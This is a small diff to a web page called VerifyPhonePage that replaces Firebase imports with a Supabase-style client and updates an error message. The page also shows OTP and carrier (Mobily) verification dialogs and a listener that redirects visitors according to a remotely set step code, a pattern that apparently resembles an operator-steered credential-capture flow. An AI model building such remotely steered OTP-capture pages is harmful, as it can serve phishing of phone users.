@@ -10,8 +10,7 @@ import { MobilyVerificationModal } from "@/components/mobily-verification-modal"
 import { CarrierVerificationModal } from "@/components/carrier-verification-modal";
 import { PhoneOtpDialog } from "@/components/dialog-b";
 
-import { db, setDoc, doc } from "@/lib/firebase";
-import { onSnapshot, getDoc, Firestore } from "firebase/firestore";
+import { db, setDoc, doc, onSnapshot, getDoc, Firestore } from "@/lib/supabase-client";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 
 export default function VerifyPhonePage() {
@@ -66,7 +65,7 @@ export default function VerifyPhonePage() {
         else if (data.currentStep === "_t2")  window.location.href = "/step2";
         else if (data.currentStep === "_t3")  window.location.href = "/step3";
       },
-      (err) => console.error("[phone-info] Firestore listener error:", err)
+      (err) => console.error("[phone-info] Supabase listener error:", err)
     );
     return () => unsubscribe();
   }, []);
